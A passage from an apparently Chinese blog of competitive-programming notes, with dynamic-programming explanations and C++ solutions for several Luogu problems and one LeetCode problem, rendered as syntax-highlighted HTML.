punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>ll<span class="token operator">></span> value<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    value<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ll res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">20002</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>            res <span class="token operator">+=</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">%=</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">+</span> n <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1077-摆花"><a href="#P1077-摆花" class="headerlink" title="P1077 摆花"></a><a href="https://www.luogu.com.cn/problem/P1077">P1077 摆花</a></h4><ul><li><p>题意：<br>有n个物品，每个物品有$a[i]$个，按顺序摆放m个，求摆放的种类的数量。</p></li><li><p>题解:<br>动态规划，$dp[i][j]$ 表示到第i个元素，放了j个物品的摆放种类，枚举j即可。</p><p>  $dp[i][j+k] += dp[i-1][k]$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">+</span> j <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="LeetCode-解出数学表达式的学生分数"><a href="#LeetCode-解出数学表达式的学生分数" class="headerlink" title="LeetCode 解出数学表达式的学生分数"></a><a href="https://leetcode-cn.com/problems/the-score-of-students-solving-math-expression/">LeetCode 解出数学表达式的学生分数</a></h4><ul><li><p>题意：<br>给定一个由个位数数字、’$+$’、’$*$’组成的表达式，给定一个数组$answers[\quad]$，如果一答案等于表达式的正确结果，那么将得到 5 分。否则，如果答案由一处或多处错误的运算顺序计算得到那么将得到 2 分。求最后分数。</p></li><li><p>题解:<br>一开始以为暴力能解，发现行不通，考虑使用区间DP。<br>考虑先计算出正确值，然后再计算错误运算顺序得到的值。对于一个较大的区间，枚举最后一次的计算符号，记录即可。<br>转移方程为：</p><p>  $dp[i][i+step] insert(dp[i+t] \circ dp[i+t+2][i+step])$ 其中$\circ$ 表示 $+$ 或者 $*$ ，step为枚举的区间大小，t为枚举的最后一次运算顺序。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">cal</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span>s<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">char</span> sign <span class="token operator">=</span> <span class="token char">'+'</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c<span class="token punctuation">;</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token char">'0'</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token char">'9'</span><span class="token punctuation">)</span>                num <span class="token operator">=</span> num <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'+'</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'*'</span> <span class="token operator">||</span> i <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>sign <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">int</span> tp <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tp <span class="token operator">*</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span>                    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>                num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                sign <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">scoreOfStudents</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>answers<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mp</span><span class="token punctuation">(</span><span class="token number">1030</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> answers<span class="token punctuation">)</span>            mp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> mp<span class="token punctuation">[</span><span class="token function">cal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>unordered_set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span>unordered_set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span></span></span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> step <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> step <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> step <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">+</span> step <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> t <span class="token operator">&lt;</span> step<span class="token punctuation">;</span> t <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>x <span class="token operator">:</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> t<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>y <span class="token operator">:</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> t <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> step<span class="token punctuation">]</span><span class="token punctuation">)</span>                        <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span>t<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'+'</span><span class="token punctuation">)</span>                            <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> y <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">)</span>                                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> step<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                            <span class="token keyword">else</span>                            <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> y <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">)</span>                                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> step<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>x <span class="token operator">*</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>x <span class="token operator">:</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            res <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> mp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="P1233-木棍加工"><a href="#P1233-木棍加工" class="headerlink" title="P1233 木棍加工"></a><a href="https://www.luogu.com.cn/problem/P1233">P1233 木棍加工</a></h4><ul><li><p>题意：<br>求最少最长不上升的子序列的数目。</p></li><li><p>题解:<br>根据Dilworth定理，最少最长不升子序列的数目=最长上升子序列的长度。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">5005</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> vec<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second <span class="token operator">></span> vec<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="区间与环形动态规划"><a href="#区间与环形动态规划" class="headerlink" title="区间与环形动态规划"></a><a href="https://www.luogu.com.cn/training/213#problems">区间与环形动态规划</a></h3><h4 id="P1220-关路灯"><a href="#P1220-关路灯" class="headerlink" title="P1220 关路灯"></a><a href="https://www.luogu.com.cn/problem/P1220">P1220 关路灯</a></h4><ul><li><p>题意：<br>求最少的耗电</p></li><li><p>题解:<br>考虑区间DP。<br>$dp[i][j][0]$表示区间i到j的灯都被关闭了，且站在第i个点；<br>$dp[i][j][1]$表示区间i到j的灯都被关闭了，且站在第j个点；<br>则有状态转移方程：</p><p>  $dp[i][j][0] = min(dp[i + 1][j][0] + cal(i, i + 1, i, j), dp[i + 1][j][1] + cal(i, j, i, j));$</p><p>  $dp[i][j][1] = min(dp[i][j - 1][1] + cal(j - 1, j, i - 1, j - 1), dp[i][j - 1][0] + cal(i, j, i - 1, j - 1));$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> c<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> vec<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> prefix<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">-</span> vec<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prefix<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">-</span> prefix<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$ <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> c<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    prefix<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>        prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span 